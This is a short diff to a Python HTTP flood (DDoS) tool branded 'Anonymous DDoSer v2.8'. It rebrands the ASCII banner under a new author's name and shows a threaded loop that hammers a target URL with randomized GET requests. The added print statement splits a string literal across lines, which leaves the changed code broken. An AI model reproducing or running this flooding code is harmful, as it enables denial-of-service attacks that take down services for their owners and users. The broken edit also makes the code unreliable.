@@ -193,8 +193,8 @@ def logo():
   ( ==  ^  == )   88"""   dP__Yb  o.`Y8b o.`Y8b  8I  dY  8I  dY Yb   dP o.`Y8b
    )         (    88     dP""""Yb 8bodP' 8bodP' 8888Y"  8888Y"   YbodP  8bodP'
   (           )   ========================================================
- ( (  )   (  ) )     Anonymous DDoSer v2.8 - Best HTTP Flooder For FREE
-(__(__)___(__)__) ===== Version: [ Private ]''')
+ ( (  )   (  ) )     Tool ddos by Thinh Dep Trai chong vao tu
+(__(__)___(__)__) 
     try:
         print("\n[*] Target : " +str(url_main)+ ":" +str(port))
     except:
@@ -779,7 +779,8 @@ class JSv1(threading.Thread):
                     http.request("GET", url, headers=headersx)
                 else:
                     http.request("GET /?=" +str(random.randint(0,20000)), headers=headersx)
-                print("[+] bit.ly/AnonyV28 | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
+                print("[+] bit.ly/AnonyV2
+        8 | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                 try:
                     for y in range(multiple):
                         http.request("GET", url,headers=headersx)
